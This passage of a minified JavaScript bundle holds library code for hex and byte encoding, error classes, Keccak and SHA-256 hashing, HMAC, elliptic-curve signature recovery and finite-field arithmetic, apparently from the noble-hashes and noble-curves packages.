`);super(o,t.cause?{cause:t.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=i,this.docsPath=n,this.metaMessages=t.metaMessages,this.name=t.name??this.name,this.shortMessage=e,this.version=dse}walk(e){return hse(this,e)}}function hse(r,e){return e?.(r)?r:r&&typeof r=="object"&&"cause"in r&&r.cause!==void 0?hse(r.cause,e):e?null:r}class fse extends kg{constructor({size:e,targetSize:t,type:i}){super(`${i.charAt(0).toUpperCase()}${i.slice(1).toLowerCase()} size (${e}) exceeds padding size (${t}).`,{name:"SizeExceedsPaddingSizeError"})}}function H3(r,{dir:e,size:t=32}={}){return typeof r=="string"?Bet(r,{dir:e,size:t}):Met(r,{dir:e,size:t})}function Bet(r,{dir:e,size:t=32}={}){if(t===null)return r;const i=r.replace("0x","");if(i.length>t*2)throw new fse({size:Math.ceil(i.length/2),targetSize:t,type:"hex"});return`0x${i[e==="right"?"padEnd":"padStart"](t*2,"0")}`}function Met(r,{dir:e,size:t=32}={}){if(t===null)return r;if(r.length>t)throw new fse({size:r.length,targetSize:t,type:"bytes"});const i=new Uint8Array(t);for(let n=0;n<t;n++){const s=e==="right";i[s?n:t-n-1]=r[s?n:r.length-n-1]}return i}class Det extends kg{constructor({max:e,min:t,signed:i,size:n,value:s}){super(`Number "${s}" is not in safe ${n?`${n*8}-bit ${i?"signed":"unsigned"} `:""}integer range ${e?`(${t} to ${e})`:`(above ${t})`}`,{name:"IntegerOutOfRangeError"})}}class Let extends kg{constructor({givenSize:e,maxSize:t}){super(`Size cannot exceed ${t} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}}function V3(r,{size:e}){if(HV(r)>e)throw new Let({givenSize:HV(r),maxSize:e})}function wP(r,e={}){const{signed:t}=e;e.size&&V3(r,{size:e.size});const i=BigInt(r);if(!t)return i;const n=(r.length-2)/2,s=(1n<<BigInt(n)*8n-1n)-1n;return i<=s?i:i-BigInt(`0x${"f".padStart(n*2,"f")}`)-1n}function Uet(r,e={}){return Number(wP(r,e))}const jet=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function bP(r,e={}){return typeof r=="number"||typeof r=="bigint"?gse(r,e):typeof r=="string"?zet(r,e):typeof r=="boolean"?Fet(r,e):pse(r,e)}function Fet(r,e={}){const t=`0x${Number(r)}`;return typeof e.size=="number"?(V3(t,{size:e.size}),H3(t,{size:e.size})):t}function pse(r,e={}){let t="";for(let n=0;n<r.length;n++)t+=jet[r[n]];const i=`0x${t}`;return typeof e.size=="number"?(V3(i,{size:e.size}),H3(i,{dir:"right",size:e.size})):i}function gse(r,e={}){const{signed:t,size:i}=e,n=BigInt(r);let s;i?t?s=(1n<<BigInt(i)*8n-1n)-1n:s=2n**(BigInt(i)*8n)-1n:typeof r=="number"&&(s=BigInt(Number.MAX_SAFE_INTEGER));const o=typeof s=="bigint"&&t?-s-1n:0;if(s&&n>s||n<o){const c=typeof r=="bigint"?"n":"";throw new Det({max:s?`${s}${c}`:void 0,min:`${o}${c}`,signed:t,size:i,value:`${r}${c}`})}const a=`0x${(t&&n<0?(1n<<BigInt(i*8))+BigInt(n):n).toString(16)}`;return i?H3(a,{size:i}):a}const qet=new TextEncoder;function zet(r,e={}){const t=qet.encode(r);return pse(t,e)}const Wet=new TextEncoder;function Het(r,e={}){return typeof r=="number"||typeof r=="bigint"?Ket(r,e):typeof r=="boolean"?Vet(r,e):Py(r)?mse(r,e):wse(r,e)}function Vet(r,e={}){const t=new Uint8Array(1);return t[0]=Number(r),typeof e.size=="number"?(V3(t,{size:e.size}),H3(t,{size:e.size})):t}const Sh={zero:48,nine:57,A:65,F:70,a:97,f:102};function VV(r){if(r>=Sh.zero&&r<=Sh.nine)return r-Sh.zero;if(r>=Sh.A&&r<=Sh.F)return r-(Sh.A-10);if(r>=Sh.a&&r<=Sh.f)return r-(Sh.a-10)}function mse(r,e={}){let t=r;e.size&&(V3(t,{size:e.size}),t=H3(t,{dir:"right",size:e.size}));let i=t.slice(2);i.length%2&&(i=`0${i}`);const n=i.length/2,s=new Uint8Array(n);for(let o=0,a=0;o<n;o++){const c=VV(i.charCodeAt(a++)),l=VV(i.charCodeAt(a++));if(c===void 0||l===void 0)throw new kg(`Invalid byte sequence ("${i[a-2]}${i[a-1]}" in "${i}").`);s[o]=c*16+l}return s}function Ket(r,e){const t=gse(r,e);return mse(t)}function wse(r,e={}){const t=Wet.encode(r);return typeof e.size=="number"?(V3(t,{size:e.size}),H3(t,{dir:"right",size:e.size})):t}function sx(r){if(!Number.isSafeInteger(r)||r<0)throw new Error("positive integer expected, got "+r)}function Get(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function Q4(r,...e){if(!Get(r))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(r.length))throw new Error("Uint8Array expected of length "+e+", got length="+r.length)}function Zet(r){if(typeof r!="function"||typeof r.create!="function")throw new Error("Hash should be wrapped by utils.wrapConstructor");sx(r.outputLen),sx(r.blockLen)}function e3(r,e=!0){if(r.destroyed)throw new Error("Hash instance has been destroyed");if(e&&r.finished)throw new Error("Hash#digest() has already been called")}function bse(r,e){Q4(r);const t=e.outputLen;if(r.length<t)throw new Error("digestInto() expects output buffer of length at least "+t)}const I8=BigInt(2**32-1),KV=BigInt(32);function Yet(r,e=!1){return e?{h:Number(r&I8),l:Number(r>>KV&I8)}:{h:Number(r>>KV&I8)|0,l:Number(r&I8)|0}}function Jet(r,e=!1){let t=new Uint32Array(r.length),i=new Uint32Array(r.length);for(let n=0;n<r.length;n++){const{h:s,l:o}=Yet(r[n],e);[t[n],i[n]]=[s,o]}return[t,i]}const Qet=(r,e,t)=>r<<t|e>>>32-t,Xet=(r,e,t)=>e<<t|r>>>32-t,ett=(r,e,t)=>e<<t-32|r>>>64-t,ttt=(r,e,t)=>r<<t-32|e>>>64-t,lm=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */function rtt(r){return new Uint32Array(r.buffer,r.byteOffset,Math.floor(r.byteLength/4))}function oT(r){return new DataView(r.buffer,r.byteOffset,r.byteLength)}function Zu(r,e){return r<<32-e|r>>>e}const GV=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function itt(r){return r<<24&4278190080|r<<8&16711680|r>>>8&65280|r>>>24&255}function ZV(r){for(let e=0;e<r.length;e++)r[e]=itt(r[e])}function ntt(r){if(typeof r!="string")throw new Error("utf8ToBytes expected string, got "+typeof r);return new Uint8Array(new TextEncoder().encode(r))}function fE(r){return typeof r=="string"&&(r=ntt(r)),Q4(r),r}function stt(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];Q4(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}class sB{clone(){return this._cloneInto()}}function vse(r){const e=i=>r().update(fE(i)).digest(),t=r();return e.outputLen=t.outputLen,e.blockLen=t.blockLen,e.create=()=>r(),e}function ott(r=32){if(lm&&typeof lm.getRandomValues=="function")return lm.getRandomValues(new Uint8Array(r));if(lm&&typeof lm.randomBytes=="function")return lm.randomBytes(r);throw new Error("crypto.getRandomValues must be defined")}const yse=[],xse=[],Cse=[],att=BigInt(0),zb=BigInt(1),ctt=BigInt(2),ltt=BigInt(7),utt=BigInt(256),dtt=BigInt(113);for(let r=0,e=zb,t=1,i=0;r<24;r++){[t,i]=[i,(2*t+3*i)%5],yse.push(2*(5*i+t)),xse.push((r+1)*(r+2)/2%64);let n=att;for(let s=0;s<7;s++)e=(e<<zb^(e>>ltt)*dtt)%utt,e&ctt&&(n^=zb<<(zb<<BigInt(s))-zb);Cse.push(n)}const[htt,ftt]=Jet(Cse,!0),YV=(r,e,t)=>t>32?ett(r,e,t):Qet(r,e,t),JV=(r,e,t)=>t>32?ttt(r,e,t):Xet(r,e,t);function ptt(r,e=24){const t=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let o=0;o<10;o++)t[o]=r[o]^r[o+10]^r[o+20]^r[o+30]^r[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=t[c],u=t[c+1],d=YV(l,u,1)^t[a],h=JV(l,u,1)^t[a+1];for(let f=0;f<50;f+=10)r[o+f]^=d,r[o+f+1]^=h}let n=r[2],s=r[3];for(let o=0;o<24;o++){const a=xse[o],c=YV(n,s,a),l=JV(n,s,a),u=yse[o];n=r[u],s=r[u+1],r[u]=c,r[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)t[a]=r[o+a];for(let a=0;a<10;a++)r[o+a]^=~t[(a+2)%10]&t[(a+4)%10]}r[0]^=htt[i],r[1]^=ftt[i]}t.fill(0)}class oB extends sB{constructor(e,t,i,n=!1,s=24){if(super(),this.blockLen=e,this.suffix=t,this.outputLen=i,this.enableXOF=n,this.rounds=s,this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,sx(i),0>=this.blockLen||this.blockLen>=200)throw new Error("Sha3 supports only keccak-f1600 function");this.state=new Uint8Array(200),this.state32=rtt(this.state)}keccak(){GV||ZV(this.state32),ptt(this.state32,this.rounds),GV||ZV(this.state32),this.posOut=0,this.pos=0}update(e){e3(this);const{blockLen:t,state:i}=this;e=fE(e);const n=e.length;for(let s=0;s<n;){const o=Math.min(t-this.pos,n-s);for(let a=0;a<o;a++)i[this.pos++]^=e[s++];this.pos===t&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:t,pos:i,blockLen:n}=this;e[i]^=t,(t&128)!==0&&i===n-1&&this.keccak(),e[n-1]^=128,this.keccak()}writeInto(e){e3(this,!1),Q4(e),this.finish();const t=this.state,{blockLen:i}=this;for(let n=0,s=e.length;n<s;){this.posOut>=i&&this.keccak();const o=Math.min(i-this.posOut,s-n);e.set(t.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return sx(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(bse(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,this.state.fill(0)}_cloneInto(e){const{blockLen:t,suffix:i,outputLen:n,rounds:s,enableXOF:o}=this;return e||(e=new oB(t,i,n,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=i,e.outputLen=n,e.enableXOF=o,e.destroyed=this.destroyed,e}}const gtt=(r,e,t)=>vse(()=>new oB(e,r,t)),mtt=gtt(1,136,256/8);function Ese(r,e){const t=e||"hex",i=mtt(Py(r,{strict:!1})?Het(r):r);return t==="bytes"?i:bP(i)}class wtt extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const t=super.get(e);return super.has(e)&&t!==void 0&&(this.delete(e),super.set(e,t)),t}set(e,t){if(super.set(e,t),this.maxSize&&this.size>this.maxSize){const i=this.keys().next().value;i&&this.delete(i)}return this}}const aT=new wtt(8192);function btt(r,e){if(aT.has(`${r}.${e}`))return aT.get(`${r}.${e}`);const t=r.substring(2).toLowerCase(),i=Ese(wse(t),"bytes"),n=t.split("");for(let o=0;o<40;o+=2)i[o>>1]>>4>=8&&n[o]&&(n[o]=n[o].toUpperCase()),(i[o>>1]&15)>=8&&n[o+1]&&(n[o+1]=n[o+1].toUpperCase());const s=`0x${n.join("")}`;return aT.set(`${r}.${e}`,s),s}function vtt(r){const e=Ese(`0x${r.substring(4)}`).substring(26);return btt(`0x${e}`)}async function ytt({hash:r,signature:e}){const t=Py(r)?r:bP(r),{secp256k1:i}=await Ke(async()=>{const{secp256k1:o}=await Promise.resolve().then(()=>lrt);return{secp256k1:o}},void 0);return`0x${(()=>{if(typeof e=="object"&&"r"in e&&"s"in e){const{r:l,s:u,v:d,yParity:h}=e,f=Number(h??d),p=QV(f);return new i.Signature(wP(l),wP(u)).addRecoveryBit(p)}const o=Py(e)?e:bP(e),a=Uet(`0x${o.slice(130)}`),c=QV(a);return i.Signature.fromCompact(o.substring(2,130)).addRecoveryBit(c)})().recoverPublicKey(t.substring(2)).toHex(!1)}`}function QV(r){if(r===0||r===1)return r;if(r===27)return 0;if(r===28)return 1;throw new Error("Invalid yParityOrV value")}async function xtt({hash:r,signature:e}){return vtt(await ytt({hash:r,signature:e}))}function Ctt(r,e,t,i){if(typeof r.setBigUint64=="function")return r.setBigUint64(e,t,i);const n=BigInt(32),s=BigInt(4294967295),o=Number(t>>n&s),a=Number(t&s),c=i?4:0,l=i?0:4;r.setUint32(e+c,o,i),r.setUint32(e+l,a,i)}function Ett(r,e,t){return r&e^~r&t}function _tt(r,e,t){return r&e^r&t^e&t}class Stt extends sB{constructor(e,t,i,n){super(),this.blockLen=e,this.outputLen=t,this.padOffset=i,this.isLE=n,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=oT(this.buffer)}update(e){e3(this);const{view:t,buffer:i,blockLen:n}=this;e=fE(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(n-this.pos,s-o);if(a===n){const c=oT(e);for(;n<=s-o;o+=n)this.process(c,o);continue}i.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===n&&(this.process(t,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){e3(this),bse(e,this),this.finished=!0;const{buffer:t,view:i,blockLen:n,isLE:s}=this;let{pos:o}=this;t[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>n-o&&(this.process(i,0),o=0);for(let d=o;d<n;d++)t[d]=0;Ctt(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=oT(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.length=n,e.pos=a,e.finished=s,e.destroyed=o,n%t&&e.buffer.set(i),e}}const Att=new Uint32Array([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),ff=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),pf=new Uint32Array(64);class Itt extends Stt{constructor(){super(64,32,8,!1),this.A=ff[0]|0,this.B=ff[1]|0,this.C=ff[2]|0,this.D=ff[3]|0,this.E=ff[4]|0,this.F=ff[5]|0,this.G=ff[6]|0,this.H=ff[7]|0}get(){const{A:e,B:t,C:i,D:n,E:s,F:o,G:a,H:c}=this;return[e,t,i,n,s,o,a,c]}set(e,t,i,n,s,o,a,c){this.A=e|0,this.B=t|0,this.C=i|0,this.D=n|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,t){for(let d=0;d<16;d++,t+=4)pf[d]=e.getUint32(t,!1);for(let d=16;d<64;d++){const h=pf[d-15],f=pf[d-2],p=Zu(h,7)^Zu(h,18)^h>>>3,g=Zu(f,17)^Zu(f,19)^f>>>10;pf[d]=g+pf[d-7]+p+pf[d-16]|0}let{A:i,B:n,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let d=0;d<64;d++){const h=Zu(a,6)^Zu(a,11)^Zu(a,25),f=u+h+Ett(a,c,l)+Att[d]+pf[d]|0,g=(Zu(i,2)^Zu(i,13)^Zu(i,22))+_tt(i,n,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=n,n=i,i=f+g|0}i=i+this.A|0,n=n+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(i,n,s,o,a,c,l,u)}roundClean(){pf.fill(0)}destroy(){this.set(0,0,0,0,0,0,0,0),this.buffer.fill(0)}}const Ttt=vse(()=>new Itt);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const pE=BigInt(0),gE=BigInt(1),ktt=BigInt(2);function Ng(r){return r instanceof Uint8Array||ArrayBuffer.isView(r)&&r.constructor.name==="Uint8Array"}function X4(r){if(!Ng(r))throw new Error("Uint8Array expected")}function t3(r,e){if(typeof e!="boolean")throw new Error(r+" boolean expected, got "+e)}const Ntt=Array.from({length:256},(r,e)=>e.toString(16).padStart(2,"0"));function r3(r){X4(r);let e="";for(let t=0;t<r.length;t++)e+=Ntt[r[t]];return e}function Ym(r){const e=r.toString(16);return e.length&1?"0"+e:e}function aB(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);return r===""?pE:BigInt("0x"+r)}const Ah={_0:48,_9:57,A:65,F:70,a:97,f:102};function XV(r){if(r>=Ah._0&&r<=Ah._9)return r-Ah._0;if(r>=Ah.A&&r<=Ah.F)return r-(Ah.A-10);if(r>=Ah.a&&r<=Ah.f)return r-(Ah.a-10)}function i3(r){if(typeof r!="string")throw new Error("hex string expected, got "+typeof r);const e=r.length,t=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const i=new Uint8Array(t);for(let n=0,s=0;n<t;n++,s+=2){const o=XV(r.charCodeAt(s)),a=XV(r.charCodeAt(s+1));if(o===void 0||a===void 0){const c=r[s]+r[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}i[n]=o*16+a}return i}function j1(r){return aB(r3(r))}function cB(r){return X4(r),aB(r3(Uint8Array.from(r).reverse()))}function n3(r,e){return i3(r.toString(16).padStart(e*2,"0"))}function lB(r,e){return n3(r,e).reverse()}function Ptt(r){return i3(Ym(r))}function iu(r,e,t){let i;if(typeof e=="string")try{i=i3(e)}catch(s){throw new Error(r+" must be hex string or Uint8Array, cause: "+s)}else if(Ng(e))i=Uint8Array.from(e);else throw new Error(r+" must be hex string or Uint8Array");const n=i.length;if(typeof t=="number"&&n!==t)throw new Error(r+" of length "+t+" expected, got "+n);return i}function $y(...r){let e=0;for(let i=0;i<r.length;i++){const n=r[i];X4(n),e+=n.length}const t=new Uint8Array(e);for(let i=0,n=0;i<r.length;i++){const s=r[i];t.set(s,n),n+=s.length}return t}function $tt(r,e){if(r.length!==e.length)return!1;let t=0;for(let i=0;i<r.length;i++)t|=r[i]^e[i];return t===0}function Rtt(r){if(typeof r!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(r))}const cT=r=>typeof r=="bigint"&&pE<=r;function mE(r,e,t){return cT(r)&&cT(e)&&cT(t)&&e<=r&&r<t}function F1(r,e,t,i){if(!mE(e,t,i))throw new Error("expected valid "+r+": "+t+" <= n < "+i+", got "+e)}function _se(r){let e;for(e=0;r>pE;r>>=gE,e+=1);return e}function Ott(r,e){return r>>BigInt(e)&gE}function Btt(r,e,t){return r|(t?gE:pE)<<BigInt(e)}const uB=r=>(ktt<<BigInt(r-1))-gE,lT=r=>new Uint8Array(r),eK=r=>Uint8Array.from(r);function Sse(r,e,t){if(typeof r!="number"||r<2)throw new Error("hashLen must be a number");if(typeof e!="number"||e<2)throw new Error("qByteLen must be a number");if(typeof t!="function")throw new Error("hmacFn must be a function");let i=lT(r),n=lT(r),s=0;const o=()=>{i.fill(1),n.fill(0),s=0},a=(...d)=>t(n,i,...d),c=(d=lT())=>{n=a(eK([0]),d),i=a(),d.length!==0&&(n=a(eK([1]),d),i=a())},l=()=>{if(s++>=1e3)throw new Error("drbg: tried 1000 values");let d=0;const h=[];for(;d<e;){i=a();const f=i.slice();h.push(f),d+=i.length}return $y(...h)};return(d,h)=>{o(),c(d);let f;for(;!(f=h(l()));)c();return o(),f}}const Mtt={bigint:r=>typeof r=="bigint",function:r=>typeof r=="function",boolean:r=>typeof r=="boolean",string:r=>typeof r=="string",stringOrUint8Array:r=>typeof r=="string"||Ng(r),isSafeInteger:r=>Number.isSafeInteger(r),array:r=>Array.isArray(r),field:(r,e)=>e.Fp.isValid(r),hash:r=>typeof r=="function"&&Number.isSafeInteger(r.outputLen)};function e6(r,e,t={}){const i=(n,s,o)=>{const a=Mtt[s];if(typeof a!="function")throw new Error("invalid validator function");const c=r[n];if(!(o&&c===void 0)&&!a(c,r))throw new Error("param "+String(n)+" is invalid. Expected "+s+", got "+c)};for(const[n,s]of Object.entries(e))i(n,s,!1);for(const[n,s]of Object.entries(t))i(n,s,!0);return r}const Dtt=()=>{throw new Error("not implemented")};function vP(r){const e=new WeakMap;return(t,...i)=>{const n=e.get(t);if(n!==void 0)return n;const s=r(t,...i);return e.set(t,s),s}}const Ltt=Object.freeze(Object.defineProperty({__proto__:null,aInRange:F1,abool:t3,abytes:X4,bitGet:Ott,bitLen:_se,bitMask:uB,bitSet:Btt,bytesToHex:r3,bytesToNumberBE:j1,bytesToNumberLE:cB,concatBytes:$y,createHmacDrbg:Sse,ensureBytes:iu,equalBytes:$tt,hexToBytes:i3,hexToNumber:aB,inRange:mE,isBytes:Ng,memoized:vP,notImplemented:Dtt,numberToBytesBE:n3,numberToBytesLE:lB,numberToHexUnpadded:Ym,numberToVarBytesBE:Ptt,utf8ToBytes:Rtt,validateObject:e6},Symbol.toStringTag,{value:"Module"}));class Ase extends sB{constructor(e,t){super(),this.finished=!1,this.destroyed=!1,Zet(e);const i=fE(t);if(this.iHash=e.create(),typeof this.iHash.update!="function")throw new Error("Expected instance of class which extends utils.Hash");this.blockLen=this.iHash.blockLen,this.outputLen=this.iHash.outputLen;const n=this.blockLen,s=new Uint8Array(n);s.set(i.length>n?e.create().update(i).digest():i);for(let o=0;o<s.length;o++)s[o]^=54;this.iHash.update(s),this.oHash=e.create();for(let o=0;o<s.length;o++)s[o]^=106;this.oHash.update(s),s.fill(0)}update(e){return e3(this),this.iHash.update(e),this}digestInto(e){e3(this),Q4(e,this.outputLen),this.finished=!0,this.iHash.digestInto(e),this.oHash.update(e),this.oHash.digestInto(e),this.destroy()}digest(){const e=new Uint8Array(this.oHash.outputLen);return this.digestInto(e),e}_cloneInto(e){e||(e=Object.create(Object.getPrototypeOf(this),{}));const{oHash:t,iHash:i,finished:n,destroyed:s,blockLen:o,outputLen:a}=this;return e=e,e.finished=n,e.destroyed=s,e.blockLen=o,e.outputLen=a,e.oHash=t._cloneInto(e.oHash),e.iHash=i._cloneInto(e.iHash),e}destroy(){this.destroyed=!0,this.oHash.destroy(),this.iHash.destroy()}}const Ise=(r,e,t)=>new Ase(r,e).update(t).digest();Ise.create=(r,e)=>new Ase(r,e);/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const Ws=BigInt(0),Xn=BigInt(1),f1=BigInt(2),Utt=BigInt(3),yP=BigInt(4),tK=BigInt(5),rK=BigInt(8);function Sa(r,e){const t=r%e;return t>=Ws?t:e+t}function jtt(r,e,t){if(e<Ws)throw new Error("invalid exponent, negatives unsupported");if(t<=Ws)throw new Error("invalid modulus");if(t===Xn)return Ws;let i=Xn;for(;e>Ws;)e&Xn&&(i=i*r%t),r=r*r%t,e>>=Xn;return i}function zc(r,e,t){let i=r;for(;e-- >Ws;)i*=i,i%=t;return i}function xP(r,e){if(r===Ws)throw new Error("invert: expected non-zero number");if(e<=Ws)throw new Error("invert: expected positive modulus, got "+e);let t=Sa(r,e),i=e,n=Ws,s=Xn;for(;t!==Ws;){const a=i/t,c=i%t,l=n-s*a;i=t,t=c,n=s,s=l}if(i!==Xn)throw new Error("invert: does not exist");return Sa(n,e)}function Ftt(r){const e=(r-Xn)/f1;let t,i,n;for(t=r-Xn,i=0;t%f1===Ws;t/=f1,i++);for(n=f1;n<r&&jtt(n,e,r)!==r-Xn;n++)if(n>1e3)throw new Error("Cannot find square root: likely non-prime P");if(i===1){const o=(r+Xn)/yP;return function(c,l){const u=c.pow(l,o);if(!c.eql(c.sqr(u),l))throw new Error("Cannot find square root");return u}}const s=(t+Xn)/f1;return function(a,c){if(a.pow(c,e)===a.neg(a.ONE))throw new Error("Cannot find square root");let l=i,u=a.pow(a.mul(a.ONE,n),t),d=a.pow(c,s),h=a.pow(c,t);for(;!a.eql(h,a.ONE);){if(a.eql(h,a.ZERO))return a.ZERO;let f=1;for(let g=a.sqr(h);f<l&&!a.eql(g,a.ONE);f++)g=a.sqr(g);const p=a.pow(u,Xn<<BigInt(l-f-1));u=a.sqr(p),d=a.mul(d,p),h=a.mul(h,u),l=f}return d}}function qtt(r){if(r%yP===Utt){const e=(r+Xn)/yP;return function(i,n){const s=i.pow(n,e);if(!i.eql(i.sqr(s),n))throw new Error("Cannot find square root");return s}}if(r%rK===tK){const e=(r-tK)/rK;return function(i,n){const s=i.mul(n,f1),o=i.pow(s,e),a=i.mul(n,o),c=i.mul(i.mul(a,f1),o),l=i.mul(a,i.sub(c,i.ONE));if(!i.eql(i.sqr(l),n))throw new Error("Cannot find square root");return l}}return Ftt(r)}const ztt=["create","isValid","is0","neg","inv","sqrt","sqr","eql","add","sub","mul","pow","div","addN","subN","mulN","sqrN"];function Wtt(r){const e={ORDER:"bigint",MASK:"bigint",BYTES:"isSafeInteger",BITS:"isSafeInteger"},t=ztt.reduce((i,n)=>(i[n]="function",i),e);return e6(r,t)}function Htt(r,e,t){if(t<Ws)throw new Error("invalid exponent, negatives unsupported");if(t===Ws)return r.ONE;if(t===Xn)return e;let i=r.ONE,n=e;for(;t>Ws;)t&Xn&&(i=r.mul(i,n)),n=r.sqr(n),t>>=Xn;return i}function Vtt(r,e){const t=new Array(e.length),i=e.reduce((s,o,a)=>r.is0(o)?s:(t[a]=s,r.mul(s,o)),r.ONE),n=r.inv(i);return e.reduceRight((s,o,a)=>r.is0(o)?s:(t[a]=r.mul(s,t[a]),r.mul(s,o)),n),t}function Tse(r,e){const t=e!==void 0?e:r.toString(2).length,i=Math.ceil(t/8);return{nBitLength:t,nByteLength:i}}function kse(r,e,t=!1,i={}){if(r<=Ws)throw new Error("invalid field: expected ORDER > 0, got "+r);const{nBitLength:n,nByteLength:s}=Tse(r,e);if(s>2048)throw new Error("invalid field: expected ORDER of <= 2048 bytes");let o;const a=Object.freeze({ORDER:r,isLE:t,BITS:n,BYTES:s,MASK:uB(n),ZERO:Ws,ONE:Xn,create:c=>Sa(c,r),isValid:c=>{if(typeof c!="bigint")throw new Error("invalid field element: expected bigint, got "+typeof c);return Ws<=c&&c<r},is0:c=>c===Ws,isOdd:c=>(c&Xn)===Xn,neg:c=>Sa(-c,r),eql:(c,l)=>c===l,sqr:c=>Sa(c*c,r),add:(c,l)=>Sa(c+l,r),sub:(c,l)=>Sa(c-l,r),mul:(c,l)=>Sa(c*l,r),pow:(c,l)=>Htt(a,c,l),div:(c,l)=>Sa(c*xP(l,r),r),sqrN:c=>c*c,addN:(c,l)=>c+l,subN:(c,l)=>c-l,mulN:(c,l)=>c*l,inv:c=>xP(c,r),sqrt:i.sqrt||(c=>(o||(o=qtt(r)),o(a,c))),invertBatch:c=>Vtt(a,c),cmov:(c,l,u)=>u?l:c,toBytes:c=>t?lB(c,s):n3(c,s),fromBytes:c=>{if(c.length!==s)throw new Error("Field.fromBytes: expected "+s+" bytes, got "+c.length);return t?cB(c):j1(c)}});return Object.freeze(a)}function Nse(r){if(typeof r!="bigint")throw new Error("field order must be bigint");const e=r.toString(2).length;return Math.ceil(e/8)}function Pse(r){const e=Nse(r);return e+Math.ceil(e/2)}function Ktt(r,e,t=!1){const i=r.length,n=Nse(e),s=Pse(e);if(i<16||i<s||i>1024)throw new Error("expected "+s+"-1024 bytes of input, got "+i);const o=t?cB(r):j1(r),a=Sa(o,e-Xn)+Xn;return t?lB(a,n):n3(a,n)}/*! noble-curves - MIT License (c) 2022 Paul Miller (paulmillr.com) */const iK=BigInt(0),T8=BigInt(1);function uT(r,e){const t=e.negate();return r?t:e}function $se(r,e){if(!Number.isSafeInteger(r)||r<=0||r>e)throw new Error("invalid window size, expected [1.."+e+"], got W="+r)}function dT(r,e){$se(r,e);const t=Math.ceil(e/r)+1,i=2**(r-1);return{windows:t,windowSize:i}}function Gtt(r,e){if(!Array.isArray(r))throw new Error("array expected");r.forEach((t,i)=>{if(!(t instanceof e))throw new Error("invalid point at index "+i)})}function Ztt(r,e){if(!Array.isArray(r))throw new Error("array of scalars expected");r.forEach((t,i)=>{if(!e.isValid(t))throw new Error("invalid scalar at index "+i)})}const hT=new WeakMap,Rse=new WeakMap;function fT(r){return Rse.get(r)||1}function Ytt(r,e){return{constTimeNegate:uT,hasPrecomputes(t){return 